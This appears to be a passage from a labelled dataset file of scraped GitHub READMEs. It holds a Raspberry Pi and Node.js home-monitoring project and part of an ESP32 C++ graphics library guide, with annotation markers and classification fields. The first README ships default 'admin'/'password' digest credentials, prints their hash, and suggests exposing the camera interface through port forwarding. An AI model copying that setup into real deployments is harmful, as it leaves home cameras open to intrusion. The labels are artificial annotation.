movement with the help of a PIR sensor.\nIf an Alarm is triggered, you get a SMS notification on your phone and the snapshots taken during the Alarm time span (customizable - default is 1 minute) are uploaded via FTP to your server.\nActivation / Deactivation of the Alarm Mode can be done in 2 ways:\nfrom the Web Client user interface\nwith a Button - for convenience reasons: it is faster than connecting from your phone / pc & toggling the Alert Mode checkbox\nthere is a 10 seconds customizable delay which allows you to move out of the PIR sensor range\na Led indicates the Alarm Mode enabled/disabled status\nIn order to avoid false positives from the PIR motion sensor, extra checks were added - a detection counter & detection interval. The Alarm gets triggered when the sensor detects movement 3 times in 5 seconds (both values configurable in code).\nTechnology\nThe project was developed using:\nRaspberry Pi - raspbian, brick button & led, Pir sensor\nNode.js - for the main application\nMjpg_streamer - to generate the video stream\nShell scripting - for easy application start (interactive & background)\nHtms/Css/Javascript + Bootstrap - the web client\nProject components\nHardware\nthis.Gpio = require('pi-gpio');\nthis.Hardware = { MotionSensor : 8, Led : 26, Button : 12 };\nRaspberry Pi\nI used Model B Revision 2 with Raspbian - any model should be Ok, just be careful with the Gpio configuration pin mappings, they can differ\nGeneric USB webcam (compatible with Raspberry Pi & Raspbian)\nYou can find a comprehensive list here http://elinux.org/RPi_USB_Webcams\nI used a very old 2MP one which seems to work out of the box with the generic drivers\nLed & Button\nPIR motion sensor\nThe one I used is available here https://www.sparkfun.com/products/13285\nIt normally connects to Analog Input (ex. on Arduino); however you can use it with Digital as well if you connect a 10K resistor between VCC & Signal\nTo make things easier you can purchase this sensor https://www.adafruit.com/products/189 and skip the soldering part (+ this one has configurable sensitivity built-in, so you might be able to skip the one implemented in the code)\nNode application\nDependencies\nexpress: ^4.12.3\nftp: ^0.3.10\nhttp-auth: ^2.2.8\nini: ^1.3.4\npi-gpio: 0.0.7\nsocket.io: ^1.3.5\ntwilio: ^2.3.0\nThe dependencies you install with NPM:\nnpm install module --save\nGeneric Application.js\nIt is the basic application object, defined to be reusable in other projects Contains the basic server code, generic config file read/write operations, generic Init & Execute & Exit methods implementations\nHome Monitoring ApplicationHM.js\nconfig.ini file\ndefault video quality & alert mode settings\nTwilio sms Api Sid, Token, To number, From number\nFtp settings\nAuthentication (digest http authentication) - defaults are admin & password :)\nYou can change them from the htdigest file (nice helper tool here http://websistent.com/tools/htdigest-generator-tool/ )\nadmin:Private:6982db7f1ddc36a0b47b5f8427dc3526\nWeb Client application\nAccessible from anywhere via port forwarding\nAvailable also on mobile (responsive web client)\nMonitoring - gets video from Mjpg_streamer server and sends it to the connected app clients\nMjpg_streamer was used as server, but if you prefer another tool like ffmpeg, you can easily replace it because of the loose integration via the start-webcam.sh script\nAlarm mode\nMonitoring - via PIR sensor\nAlarm - Sms notification (implemented with the help of Twilio text messaging API - very cool service, offers great Trial account for development\nAlarm - Snapshots upload to server via Ftp\nWeb Client - responsive\nThe client application was designed to be accessible on all platforms (pc / tablet / mobile).\nVideo streaming quality settings\nBy default the 480p at 25fps is enabled (initial settings are loaded from the config.ini file)\nMy webcam is a low-end 5+ years old 2mp device, but for those of you with better webcams I also added 720p & 1080p\nVideo resolutions & fps can be configured from the /static/js/script.js file\nui.quality480p.change(function(){ ConfigUpdateQuality(\"640x480\",25); });\nui.quality720p.change(function(){ ConfigUpdateQuality(\"1280x720\",15); });\nui.quality1080p.change(function(){ ConfigUpdateQuality(\"1920x1080\",5); });\nAlert Mode\ninitial state is loaded from the config.ini file\nYou can enable/disable monitoring from checkbox button in the UI\nThe state of the Alert Mode is shown both in the UI (the checkbox) but also by the LED\nThe physical Button can be also used to toggle the Alert Mode\nAll state changes are sent to all connected clients\nIf an Alarm is triggered, the UI checkbox button background will be changed to Red\nConnected Clients\nThe dropdown shows a list of all connected clients (connection timestamp & IP) that are currently viewing the video stream\nShell Scripts\nstart-app.sh\nYou can start the application in 2 modes:\nInteractive (for dev / testing): ./start-app.sh\nBackground: ./start-app.sh -background\n#!/bin/bash\n# application start in interactive or background mode\n#arguments: [-background]\ncd /home/pi/Desktop/rpiWorkspace/Node/HomeMonitoring/\nif [ \"$1\" = \"-background\" ]; then\nsudo nohup node ./App-home-monitoring.js &>log.txt &\nelse\nsudo node ./App-home-monitoring.js\nfi\nstart-webcam.sh\nUsed by the application to enable/disable video streaming when clients are connected or when an Alarm is triggered by the PIR sensor.\n#!/bin/bash\n# webcam video stream\n# arguments: [resolution] [port] [fps]\npkill mjpg_streamer\nsudo nohup ./mjpg-streamer/mjpg_streamer -i \"./mjpg-streamer/input_uvc.so -y -r $1 -f $3 -q 75\" -o \"./mjpg-streamer/output_http.so -n -p $2\" &\nApplication Execution Session example\nTO DO\nPort the application to Windows 10 Iot on Raspberry Pi 2\nSupport for uploading snapshots to cloud (OneDrive / Dropbox) when an Alarm is triggered\nReferences\nRaspberry Pi https://www.raspberrypi.org/\nNode - https://nodejs.org/en/\nMjpg_streamer http://sourceforge.net/projects/mjpg-streamer/\nSMS Api - Twilio - https://www.twilio.com/sms\nBootstrap http://getbootstrap.com/\nApp Webcam Icon - https://www.iconfinder.com/icons/71274/webcam_icon#size=128\nLinks\nBlog post about project Home Monitoring with Raspberry Pi & Node\nHackster.io project page\ntwitter @orosandrei", "link": "https://github.com/orosandrei/Home-Monitoring-Raspberry-Pi-Node", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "home monitoring with raspberry pi and node.js\ndescription\nthe project is designed as a end to end solution for a diy home monitoring & intruder alert system. besides offering a live video stream on any device (web responsive client), it also actively monitors for movement with the help of a pir sensor.\nif an alarm is triggered, you get a sms notification on your phone and the snapshots taken during the alarm time span (customizable - default is 1 minute) are uploaded via ftp to your server.\nactivation / deactivation of the alarm mode can be done in 2 ways:\nfrom the web client user interface\nwith a button - for convenience reasons: it is faster than connecting from your phone / pc & toggling the alert mode checkbox\nthere is a 10 seconds customizable delay which allows you to move out of the pir sensor range\na led indicates the alarm mode enabled/disabled status\nin order to avoid false positives from the pir motion sensor, extra checks were added - a detection counter & detection interval. the alarm gets triggered when the sensor detects movement 3 times in 5 seconds (both values configurable in code).\ntechnology\nthe project was developed using:\nraspberry pi - raspbian, brick button & led, pir sensor\nnode.js - for the main application\nmjpg_streamer - to generate the video stream\nshell scripting - for easy application start (interactive & background)\nhtms/css/javascript + bootstrap - the web client\nproject components\nhardware\nthis.gpio = require('pi-gpio');\nthis.hardware = { motionsensor : 8, led : 26, button : 12 };\nraspberry pi\ni used model b revision 2 with raspbian - any model should be ok, just be careful with the gpio configuration pin mappings, they can differ\ngeneric usb webcam (compatible with raspberry pi & raspbian)\nyou can find a comprehensive list here http://elinux.org/rpi_usb_webcams\ni used a very old 2mp one which seems to work out of the box with the generic drivers\nled & button\npir motion sensor\nthe one i used is available here https://www.sparkfun.com/products/13285\nit normally connects to analog input (ex. on arduino); however you can use it with digital as well if you connect a 10k resistor between vcc & signal\nto make things easier you can purchase this sensor https://www.adafruit.com/products/189 and skip the soldering part (+ this one has configurable sensitivity built-in, so you might be able to skip the one implemented in the code)\nnode application\ndependencies\nexpress: ^4.12.3\nftp: ^0.3.10\nhttp-auth: ^2.2.8\nini: ^1.3.4\npi-gpio: 0.0.7\nsocket.io: ^1.3.5\ntwilio: ^2.3.0\nthe dependencies you install with npm:\nnpm install module --save\ngeneric application.js\nit is the basic application object, defined to be reusable in other projects contains the basic server code, generic config file read/write operations, generic init & execute & exit methods implementations\nhome monitoring applicationhm.js\nconfig.ini file\ndefault video quality & alert mode settings\ntwilio sms api sid, token, to number, from number\nftp settings\nauthentication (digest http authentication) - defaults are admin & password :)\nyou can change them from the htdigest file (nice helper -----> tool !!!  here http://websistent.com/tools/htdigest-generator-tool/ )\nadmin:private:6982db7f1ddc36a0b47b5f8427dc3526\nweb client application\naccessible from anywhere via port forwarding\navailable also on mobile (responsive web client)\nmonitoring - gets video from mjpg_streamer server and sends it to the connected app clients\nmjpg_streamer was used as server, but if you prefer another tool like ffmpeg, you can easily replace it because of the loose integration via the start-webcam.sh script\nalarm mode\nmonitoring - via pir sensor\nalarm - sms notification (implemented with the help of twilio text messaging api - very cool service, offers great trial account for development\nalarm - snapshots upload to server via ftp\nweb client - responsive\nthe client application was designed to be accessible on all platforms (pc / tablet / mobile).\nvideo streaming quality settings\nby default the 480p at 25fps is enabled (initial settings are loaded from the config.ini file)\nmy webcam is a low-end 5+ years old 2mp device, but for those of you with better webcams i also added 720p & 1080p\nvideo resolutions & fps can be configured from the /static/js/script.js file\nui.quality480p.change(function(){ configupdatequality(\"640x480\",25); });\nui.quality720p.change(function(){ configupdatequality(\"1280x720\",15); });\nui.quality1080p.change(function(){ configupdatequality(\"1920x1080\",5); });\nalert mode\ninitial state is loaded from the config.ini file\nyou can enable/disable monitoring from checkbox button in the ui\nthe state of the alert mode is shown both in the ui (the checkbox) but also by the led\nthe physical button can be also used to toggle the alert mode\nall state changes are sent to all connected clients\nif an alarm is triggered, the ui checkbox button background will be changed to red\nconnected clients\nthe dropdown shows a list of all connected clients (connection timestamp & ip) that are currently viewing the video stream\nshell scripts\nstart-app.sh\nyou can start the application in 2 modes:\ninteractive (for dev / testing): ./start-app.sh\nbackground: ./start-app.sh -background\n#!/bin/bash\n# application start in interactive or background mode\n#arguments: [-background]\ncd /home/pi/desktop/rpiworkspace/node/homemonitoring/\nif [ \"$1\" = \"-background\" ]; then\nsudo nohup node ./app-home-monitoring.js &>log.txt &\nelse\nsudo node ./app-home-monitoring.js\nfi\nstart-webcam.sh\nused by the application to enable/disable video streaming when clients are connected or when an alarm is triggered by the pir sensor.\n#!/bin/bash\n# webcam video stream\n# arguments: [resolution] [port] [fps]\npkill mjpg_streamer\nsudo nohup ./mjpg-streamer/mjpg_streamer -i \"./mjpg-streamer/input_uvc.so -y -r $1 -f $3 -q 75\" -o \"./mjpg-streamer/output_http.so -n -p $2\" &\napplication execution session example\nto do\nport the application to windows 10 iot on raspberry pi 2\nsupport for uploading snapshots to cloud (onedrive / dropbox) when an alarm is triggered\nreferences\nraspberry pi https://www.raspberrypi.org/\nnode - https://nodejs.org/en/\nmjpg_streamer http://sourceforge.net/projects/mjpg-streamer/\nsms api - twilio - https://www.twilio.com/sms\nbootstrap http://getbootstrap.com/\napp webcam icon - https://www.iconfinder.com/icons/71274/webcam_icon#size=128\nlinks\nblog post about project home monitoring with raspberry pi & node\nhackster.io project page\ntwitter @orosandrei", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000812, "year": null}, {"Unnamed: 0": 830, "autor": 830, "date": null, "content": "Introduction\nI wanted a graphics library that was faster and better than what I had found for various IoT devices. The most popular is probably Adafruit_GFX, but it's not optimal. It's very minimalistic, not very optimized, and doesn't have a fully decoupled driver interface. Also, being tied to the Arduino framework, it can't take advantage of platform specific features that increase performance, like being able to switch between interrupt and polling based SPI transactions on the ESP32.\nGFX on the other hand, isn't tied to anything. It can draw anywhere, on any platform. It's basically standard C++, and things like line drawing and font drawing algorithms. Without a driver, it can only draw to in memory bitmaps, but once you add a driver to the mix, you can draw directly onto displays the same way you do to bitmaps.\nUpdate: Some minor bugfixes, SPI drivers are refactored to use a common base, more drivers are now added, and one click configuration for generic ESP32 boards is now available\nUpdate 2: Included support for the LilyGo TTGO board, as well as the green tab 128x128 1.44\" ST7735 display (though other green tab models may work too they have not been tested)\nUpdate 3: Added transparent_color argument to draw::bitmap<>() so you can do sprites.\nUpdate 4: GFX draw::rectangle<>() bugfix and added experimental MAX7219 driver\nUpdate 5: Bug fixes with bitmap drawing\nUpdate 6: Fixed some of the demos that were failing the build\nUpdate 7: Added alpha blending support!\nUpdate 8: Some API changes, added large_bitmap<> support and edged a little closer to adaptive indexed color support. I also used the large bitmap for the frame buffer in the demos, and changed that code to be easier to understand at the cost of raw pixel throughput.\nUpdate 9: Added polygon and path support, and cleaned up the API here and there a bit\nUpdate 10: Fixed several build errors with the last update. Mea culpa.\nUpdate 11: Added bilinear and bicubic resampling for draw::bitmap<>() resizing options, and fixed the nearest neighbor drawing. Also improved the performance of the drawing during resize (though bicubic could stand to be optimized to use ints instead of floats). Added image dimensions to jpeg_image::load()'s callback.\nUpdate 12: Easy of use update. I've compiled all of the includes into a single includable header, and I've added draw::image<>() which deals with the progressive loading so you don't need to do it yourself.\nUpdate 13: Service release. Certain draw operations between certain draw targets would fail to compile\nUpdate 14: Added palette/CLUT support! (still a baby, not quite complete but I'll mature it as I go)\nUpdate 15: Service release. Fixed large_bitmap<> out of bounds crashing issue\nUpdate 16: Added Arduino framework support and several drivers. I have not tested the Arduino framework support with anything other than an ESP32, but it will not necessarily compile on all Arduinos.\nUpdate 17: Added support for two e-ink/e-paper displays: the DEP0290B (and the associated LilyGo T5 2.2 board) as well as the GDEH0154Z90 (WaveShare 1.54 inch 3-color black/white/red display). The former only works on the Arduino Framework for now, until I hunt down the issue under the ESP-IDF that prevents it from working.\nUpdate 18: Added dithering support for e-paper displays\nUpdate 19: Added TrueType font support!\nUpdate 20: Service release - fixed a stream.hpp bug and updated platformio.ini to build for the newer ESP-IDF\nUpdate 21: A bugfix, and the addition of the viewport<> template class that allows for rotation and offsetting of drawing operations.\nUpdate 22: Added performance improvement to viewport<> and changed API slightly. Updated the RA8875 driver with performance improvements, hardware scrolling, and touch support.\nUpdate 23: Restructure of source files, plus some fixes with compile time errors with certain combinations of draw targets and draw operations. This is no longer a header only library because I needed to expand its targeting past IoT devices, and be used in more build situations/environments. The header only library only worked without conflicts under certain build environments. Furthermore I've added TFT_eSPI bindings/drivers for superior performance and additional device support.\nUpdate 24: Added Windows DirectX support for rapid prototyping. Fixed compile errors under certain environmen\nBuilding this Mess\nYou'll need Visual Studio Code with the Platform IO extension installed. You'll need an ESP32 with a connected ILI9341 LCD display an SSD1306 display, or other display depending on the demo.\nI recommend the Espressif ESP-WROVER-KIT development board which has an integrated ILI9341 display and several other pre-wired peripherals, plus an integrated debugger and a superior USB to serial bridge with faster upload speeds. They can be harder to find than a standard ESP32 devboard, but I found them at JAMECO and Mouser for about $40 USD. They're well worth the investment if you do ESP32 development. The integrated debugger, though very slow compared to a PC, is faster than you can get with an external JTAG probe attached to a standard WROVER devboard.\nMost of you however, will be using one or more of the generic esp32 configurations. First decide which framework you want to use - ESP-IDF, or Arduino. At the bottom of the screen in the blue bar of VS Code, there is a configuration switcher. It should be set at Default to start, but you can change it by clicking on default. A list of many configurations will drop down from the top of the screen. From there, you can choose which generic esp32 setup you have, based on the display attached to it, and with it, which framework you want to use.\nIn order to wire all this up, refer to wiring_guide.txt which has display wirings for SPI and I2C displays. Keep in mind some display vendors name their pins with non-standard names. For example, on some displays MOSI might be labled as DIN or A0. You make have to do some googling to find out the particulars for your device.\nBefore you can run it, you must Upload Filesystem Image under the Platform IO sidebar - Tasks.\nNote: The Platform IO IDE is kind of cantankerous sometimes. The first time you open the project, you'll probably need to go to the Platform IO icon on the left side - it looks like an alien. Click it to open up the sidebar and look under Quick Access|Miscellaneous for Platform IO Core CLI. Click it, and then when you get a prompt type pio run to force it to download necessary components and build. You shouldn't need to do this again, unless you start getting errors again while trying to build. Also, for some reason, whenever you switch a configuration you have to go and refresh (the little circle-arrow next to \"PROJECT TASKS\") before it will take.\nThe demos are not all the same despite GFX capabilities being pretty much the same for each display. The reason is that there are no asynchronous operations for I2C devices, and because some of the displays simply aren't big enough to show the jpgs or they are monochrome like the SSD1306, so the JPG would look a mess.\nThe following configurations are currently supported. Select the one that you want to use before building:\nesp-idf-esp-wrover-kit\nesp-idf-lilygo-ttgo\nesp-idf-ST7735\nesp-idf-ILI9341\nesp-idf-ST7789\nesp-idf-SSD1306\nesp-idf-SSD1351\nesp-idf-MAX7219*\nesp-idf-GDEH0154Z90\narduino-esp-wrover-kit\narduino-lilygo-ttgo\narduino-lilygo-t5_v22\narduino-ILI9341\narduino-DEPG0290B\narduino-GDEH0154Z90\narduino-ST7789\narduino-SSD1306\narduino-SSD1351\narduino-ST7735\narduino-RA8875\narduino-TFT_eSPI\nwindows-DirectX\nThe MAX7219 CS pin is 15, not 5. Driver is experimental and multiple rows of segments does not work, but multiple segments in a single row works.\nBuilding with TFT_eSPI\nTFT_eSPI by Bodmer is probably the fastest TFT driver for the Arduino framework. It really is a great offering, but it works a lot differently that GFX, and has different features. With the gfx_tft_espi driver you can use GFX with TFT_eSPI and enjoy higher framerates and even more supported displays, while taking advantage of GFX features like True Type and flexible pixel formats.\nI do not provide Bodmer's library with this distribution, for several reasons, and I don't recommend using it via lib_deps / fetching it using platform IO's automated installer. Download it from Bodmer's Github repository here and put it under the libs folder in the gfx_demo project. Switch to the arduino-TFT_eSPI configuration. As long as this library is in that folder the other projects won't build. Unfortunately I haven't found a way to work around this with PlatformIO without modifying TFT_eSPI itself which is a non-starter.\nHere's the process:\nDownload the library and unzip it.\nPut it under /lib (The TFT_eSPI-master folder should be alongside the gfx folder)\nSwitch your configuration to arduino-TFT_eSPI\nConfigure the TFT_eSPI library by setting your display and pins in User_Setup.h under his library's folder.\nBuilding with Windows and DirectX\nFirst go to PlatformIO/Quick Access/Miscellaneous/PlatformIO Core CLI, open a new console and type:\nBAT\npio platform install \"windows_x86\"\nGo to your project, and open /src/windows/directx_demo.hpp. Once there, change #define FONT_PATH \"Maziro.ttf\" so that the path matches the full path to that font file, which will be under the /fonts folder.\nNext, this is a little tricky, due to an inconsistency between Microsoft's C++ compiler, and GCC. You must patch a system header, or your programs will crash. The patch won't hurt other programs, in fact, the other programs will still crash on the patched header if compiled with GCC. This is because you have to define WIDL_EXPLICIT_AGGREGATE_RETURNS in order for the patched code to take effect.\nNow you need to build the Windows configuration to ensure PlatformIO has all of the files it needs.\nNext you need to locate PlatformIO's copy of the system header d2d1.h. You can do so by opening windows/drivers/dxd2d.hpp and finding #include <d2d1.h> and then right clicking on the filename and selecting \"Go to Definition.\" One there, right click on it's tab to copy the full path.\nNext use the Windows search bar to search for Notepad, right click on the result, and click \"Run as Administrator.\"\nOnce it's open, go to open a file, and paste the path into the dialog box, and hit enter.\nGo to VS Code, and copy the contents of d2d1_patched_minigw.h and paste them into your Notepad instance. Finally, save.\nNow go to PlatformIO and Clean your project. This must be done.\nNow you can build a working application. Keep in mind Windows works dramatically different in terms of flow than an IoT application. You must render each frame on the WM_PAINT event, so the structure of the demo is far different than the others, employing a state machine to make a coroutine out of the lines demo.\nIn order to run the application, open a console again. Then you need to type the following command:\nBAT\n.pio\\build\\windows-DirectX\\program.exe\nThe driver is not very fast, due to the \"polarity mismatch\" between DirectX and GFX. DirectX works far differently than GFX and bridging the gap is not efficient. This driver is meant for prototyping screens, and for that it is effective, since it shortens build times and eliminates upload times.\nE-Paper Display Support\nBlack and white e-paper display drivers can virtualize an expanded bit depth to emulate grayscales through dithering. The final template parameter of the driver indicates the bit depth and defaults to 1, which disables dithering.\nColor e-paper displays dither or they will match the nearest color among their palette. If you need better dithering performance, you can predither your JPEGs in a paint program targeting the e-paper display's palette and then disable virtualization. The final template parameter indicates the pixel type of the color pixel you wish to virtualize.\nKeep in mind the higher the virtualized bit depth, the more memory the driver will use.\nConcepts\nBelow is a high level summary. For more detailed information, I've been producing a series which begins at the link.\nDraw Sources and Destinations\nGFX introduces the idea of draw sources and destinations. These are vaguely or loosely defined types that expose a set of members that allow GFX to bind to them to perform drawing operations. The set of members they expose varies based on their capabilities, and GFX adapts to call them in the most efficient manner that the target supports for the given operation. The drawing functions in GFX take destinations, and some operations such as copying bitmapped pixel data or otherwise reading pixel information take sources.\nThe code size is related to how many different types of sources and destinations you have, and what kind of drawing or copying you're doing between them. The more diverse your sources and destinations, the larger the code.\nDraw sources and destinations include in memory bitmaps and display drivers, but you can potentially craft your own. We'll be getting into how later.\nBitmaps\nBitmaps are sort of all-purpose draw source/destinations. They basically allow you to hold drawn data around in memory, which you can then draw somewhere else. Bitmaps do not hold their own memory. This is because not all memory is created equal. On some platforms for example, in order to enable a bitmap to be sent to the driver, the bitmap data must be stored in DMA capable RAM. The other reason is so you can recycle buffers. When you're done with a bitmap you can reuse the memory for another bitmap (as long as it's big enough) without deallocating or reallocating. The disadvantage is a small amount of increased code complexity wherein you must determine the size you need for the bitmap, and then allocate the memory for it yourself, and possibly freeing it yourself later.\nDrivers\nDrivers are a typically a more limited draw target, but may have performance features, which GFX will use when available. You can check what features draw sources and destinations have available using the caps member so that you can call the right methods for the job and for your device. You don't need to worry about that if you use the draw class which does all the work for you. Drivers may have certain limitations in terms of the size of bitmap they can take in one operation, or performance characteristics that vary from device to device. As much as possible, I've tried to make using them consistent across disparate sources/destinations, but some devices, like e-paper displays are so different that care must be taken when using them in order to employ them in the way that is most effective.\nCustom\nYou can implement your own draw sources and destinations by simply writing a class with the appropriate members. We'll cover that toward the end.\nPixel Types\nPixels in GFX may take any form you can imagine, up to your machine's maximum word size. They can have as many as one channel per bit, and will take on any binary footprint you specify. If you want a 3 bit RGB pixel, you can easily make one, and then create bitmaps in that format - where there are 3 pixels every 9 bytes. You'll never have to worry whether or not this library can support your display driver or file format's pixel and color model. With GFX, you can define the binary footprint and channels of your pixels, and then extend GFX to support additional color models other than the 4 it supports simply by telling it how to convert to and from RGB*.\n*Indexed pixel formats are accounted for, but there are certain restrictions in place and care must be taken when using them because they need an associated palette in order to resolve to a color.\nWhen you declare a pixel format, it becomes part of the type signature for anything that uses it. For example, a bitmap that uses a 24-bit pixel format is a different type than one that uses a 16-bit pixel format.\nDue to this, the more pixel formats you have, the greater your code size will be.\nAlpha Blending\nIf you create pixels with an alpha channel, it will be respected on supported destinations. Not all devices support the necessary features to enable this. It's also a performance killer, with no way to make it faster without hardware support, which isn't currently available for any supported device. Typically, it's best to alpha blend on a bitmap, and then draw the bitmap to a driver due to performance issues and the fact that many drivers currently do not act as draw sources, and so cannot alpha blend.\nIndexed Color/Palette Support\nSome draw destinations use an indexed color scheme, wherein they might have 16 active colors for example picked from a palette of 262,144 possible colors. Or they may have a fixed set of 8 active colors and that's all. The active colors are all that can be displayed at any given point. This was common on older systems with limited frame buffer sizes. It may also be the case with some IoT display hardware, especially color e-paper displays. e-paper displays range from 2 color (monochrome) to 7 color that I've seen.\nDraw targets that use an indexed pixel for their pixel_type - that is, devices with pixels that have a channel with a channel_name of index, are expected to expose a palette_type type alias that indicates the type of the palette they are using, as well as a palette_type* palette() const method that returns a pointer to the current palette.\nWhen you draw to a target that has indexed pixels, a best effort attempt is made to match the requested color with one of the active colors in the palette. It will match the closest color it finds. This isn't free. It's pretty CPU intensive so buyer beware, especially when loading JPEGs or something into an indexed target. It will have to run a nearest match on every single pixel, scanning through the palette once for every pixel!\nYou have to be careful with indexed colors. They can't be used in isolation, because without a palette you don't have enough information to get a color from it. Draw targets can have palettes, so the combination of an indexed pixel and a matching draw target yields a valid color. Because of this you can't use the color<> template with indexed colors, for example, because without a palette there's no way to know what index value best corresponds to, for example old_lace, or even white. You'll hopefully get compile errors when you try to use indexed pixels in places where they can't be used, but worse case, you get errors at run time when trying to draw. When trying to draw, this is usually not something you have to worry about much.\nIf you must translate indexed pixels to other kinds of pixels yourself can use convert_palette_from<>(), convert_palette_to<>() and convert_palette<>(). These will convert to and from indexed colors optionally alpha blending in the process. They take draw targets in order to get access to the palette information.\nDrawing Elements\nDrawing elements are simply things that can be drawn, like lines and circles.\nPrimitives\nDrawing primitives include lines, points, rectangles, arcs, ellipses and polygons each except the first two in filled and unfilled varieties. Most take bounding rectangles to define their extents, and for some such as arcs and lines, orientation of the rectangle will alter where or how the element is drawn.\nDraw Sources\nDraw sources again, are things like bitmaps, or display drivers that support read operations. These can be drawn to draw destinations, again like other bitmaps or display drivers that support write operations. The more different types of source and destination combinations that are used in draw operations, the larger the code size. When drawing these, the orientation of the destination rectangle indicates whether to flip the drawing along the horizontal or vertical axes. The draws can also be resized, cropped, or pixel formats converted.\nFonts\nGFX supports two types of fonts. It supports a fast raster font and True Type or Open Type fonts, depending on your needs. If you need quick and dirty, with the emphasis on quick, use the font class. For pretty, scalable and potentially anti-aliased fonts at the expense of performance, use the open_font class.\nThe behavior and design of each are slightly different due to different capabilities and different performance considerations. For example, raster fonts are always allocated in either RAM or PROGMEM space. This is because they are small and so that they will operate at maximum speed. TrueType fonts on the other hand, are larger, much more complicated fonts, and so GFX will stream them directly from a file as needed, trading speed for minimal RAM use. Unlike raster fonts, True Type fonts are essentially not loaded into memory, and will only cause temporary memory allocations as needed to render text.\nBoth font and open_font can be loaded from a readable, seekable stream such as a file_stream. This if anything, will make font slightly quicker and open_font much slower than when you embed them. The raster fonts are old Windows 3.1 FON files while the True Type font files are platform agnostic TTF and OTF files.\nAlternatively, you can use the fontgen to create a C++ header file from a font file. This header can then be included in order to embed the font data directly into your binary. This is a static resource rather than loaded into the heap. This is the recommended way of loading fonts when you can, especially with open_font.\nWhen fonts are drawn, very basic terminal control characters like tab, carriage return, and newline are supported. Raster fonts can be drawn with or without a background, though it's almost always much faster to draw them with one, at least when drawing to a display.\nTrue Type Layout Considerations\nTrue Type fonts must usually be downscaled from their native size before being displayed. You can use the scale() method passing the desired font height in pixels.\nNote that sizes and positions with True Type are somewhat approximate in that they don't always reflect what you think they might. Part of that is nature of digital typesetting and part of that is because non-commercial font files often have bad font metrics in them. It usually takes some trial and error to get them pixel perfect.\nAlso note that unlike raster fonts, True Type font glyphs aren't limited to a bounding box. They can overhang part of the letter outside of the specified draw area which can lead to the left and top edges of letters in your destination area being clipped. Fortunately, you can draw text with an offset parameter to offset the text within the drawing area to avoid this, and/or to adjust the precise position of the text.\nIn addition to loading and providing basic information about fonts, the font and open_font classes also allow you to measure how much space a particular region of text will require in that font.\nImages\nImages include things like JPEGs, which is currently the only format this library supports, although PNG will be included soon-ish.\nImages are not drawing elements because it's not practical to either load an image into memory all at once, nor get random access to the pixel data therein, due to compression or things like progressively stored data.\nIn order to work with images, you can use the draw class which will draw all or part of the image to a destination, or you can handle a callback that reports a portion of an image at a time, along with a location that indicates where the portion is within the image. For example, for JPEGs a small bitmap (usually 8x8 or so) is returned for each 8x8 region from left to right, top to bottom. Each time you receive a portion, you can draw it to the display or some other target, or you can postprocess it or whatever.\nCurrently unlike with fonts, there is no tool to create headers that embed images directly into your binary. This will probably be added in a future version.\nPerformance\nFor the most part, GFX makes a best effort attempt to reduce the number of times it has to call the driver (with the exception of batch writes), even if that means working the CPU a little harder. For example, instead of drawing a diagonal line as a series of points, GFX draws a line as series of horizontal or vertical line segments. Instead of rending a font dot by dot, GFX will batch if possible, or otherwise use run lengths to draw fonts as a series of horizontal lines instead of individual points. Trading CPU for reduced bus traffic is a win because usually you have a lot more of the former than the latter to spare, not that you have much of either one. GFX is relatively efficient, eschewing things like virtual function calls, but most of the gain is through being less chatty at the bus level.\nThat said, there are ways to significantly increase performance by using features of GFX which are designed for exactly that.\nBatching\nOne way to increase performance by reducing bus traffic is by batching. Normally, in order to do a drawing operation, a device must typically set the target rectangle for the draw beforehand, including when setting a single pixel. On an ILI9341 display, this resolves to 6 spi transactions in order to write a pixel, due to DC line control being required which splits each command into two transactions.\nOne way to cut down on that overhead dramatically is to set this address window, and then fill it by writing out pixels left to right, top to bottom without specifying any coordinates. This is known as batching and it can cut bus traffic and increase performance by orders of magnitude. GFX will use it for you when it can, and if it's an available feature on the draw destination.\nThe primary disadvantage to this is simply the limited opportunities to use it. It's great for things like drawing filled rects, or drawing bitmaps when blting and DMA transfers are unavailable, but you have to be willing to fill an entire rectangle with pixels in order to use it. If you're drawing a font with a transparent background or a 45 degree diagonal line for example, GFX effectively won't be able to batch. Batching can occur whenever there is an entire rectangle of pixels which must be drawn, and a direct transfer of bitmap data isn't possible, either because the source or target doesn't support it, or because some sort of operation like bit depth conversion or resizing needs to happen. Batching makes for a great way to speed up these types of operations. You can't use it directly unless you talk right at the driver, because at the driver level, using it incorrectly can create problems in terms of what is being displayed. GFX will use it wherever possible when you use draw.\nDouble Buffering with Suspend/Resume\nSome devices will support double buffering. This can reduce bus traffic when the buffer is in local RAM such as it is with the SSD1306 driver, but even if it's stored on the display device using suspend and resume can make your drawing not flicker so much. What happens is once suspended, any drawing operations are stored instead of sent to the device. Once resumed, the drawn contents get updated all at once. In some situations, this can generate more bus traffic than otherwise, because resuming typically has to send a rectangle bounding the entire modified section to the device. Therefore, this is more meant for smooth drawing than raw throughput. GFX will use it automatically when drawing, but you can use it yourself to extend the scope of the buffered draw, since GFX wouldn't know for example, that you intended to draw 10 lines before updating the display. It will however, buffer on a line by line basis even if you don't, again if the target supports it.\nAsynchronous Operations\nAsynchronous operations, when used appropriately, are a powerful way to increase the throughput of your graphics intensive application. The main downside of using it, is typically asynchronous operations incur processing overhead compared to their synchronous counterparts, coupled with the fact that you have to use it very carefully, and when transferring lots of data in order to get a benefit out of it, which means lots of RAM use.\nHowever, when you need to transfer a lot of a data at a time, using asynchronous operations can be a huge win, allowing you to fire off a big transfer in the background, and then almost immediately begin drawing your next frame, well before the transfer completes.\nTypically in order to facilitate this, you'll create two largeish bitmaps (say, 320x16) and then what you do is you draw to one while sending the other asynchronously, and then once the send is done, you flip them so now you're drawing on the latter one while sending the first one that you just drew.\nDrawing bitmaps asynchronously is really the only time you're going to see throughput improvements. The reason there are other asynchronous API calls as well is usually in order to switch from asynchronous to synchronous operations all the pending asynchronous operations in the target's queue have to complete, so basically after you queue your bitmap to draw, you can continue to queue asynchronous line draws and such in order to avoid having to wait for the pending operations to complete. However, when you're using the flipping bitmaps method above to do your asynchronous processing, these other asynchronous methods won't be necessary, since drawing to bitmaps is always synchronous, and has nothing to do with bus traffic or queuing asynchronous bus transactions. Drawing synchronously to bitmaps does not affect the asynchronous queue of the draw target. Each asynchronous queue is specific to the draw source or destination in question.\nPerformance Differences By Framework\nESP-IDF\nThe ESP-IDF is capable of doing asynchronous DMA transfers over SPI, but right now the overall SPI 